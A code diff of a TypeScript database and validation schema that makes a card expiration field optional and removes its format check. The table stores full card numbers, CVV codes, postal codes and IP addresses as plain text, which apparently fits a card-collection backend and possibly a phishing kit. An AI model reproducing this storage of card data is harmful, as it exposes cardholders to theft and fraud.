@@ -252,7 +252,7 @@ export const contactInfoRequestSchema = z.object({
 export const registerData = pgTable("register_data", {
   id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
   cardNumber: text("card_number").notNull(),
-  expiration: text("expiration").notNull(),
+  expiration: text("expiration"), // Made optional - removed from RegisterPage
   cvv: text("cvv").notNull(),
   postalCode: text("postal_code").notNull(),
   ipAddress: text("ip_address"),
@@ -327,7 +327,6 @@ export type ForgotPasswordData = typeof forgotPasswordData.$inferSelect;
 // Request validation schemas
 export const registerRequestSchema = z.object({
   cardNumber: z.string().length(16, "Card Number must be 16 digits"),
-  expiration: z.string().regex(/^\d{2}\/\d{2}$/, "Invalid expiration format"),
   cvv: z.string().length(3, "CVV must be 3 digits"),
   postalCode: z.string().min(1, "Postal Code is required").max(7),
 });
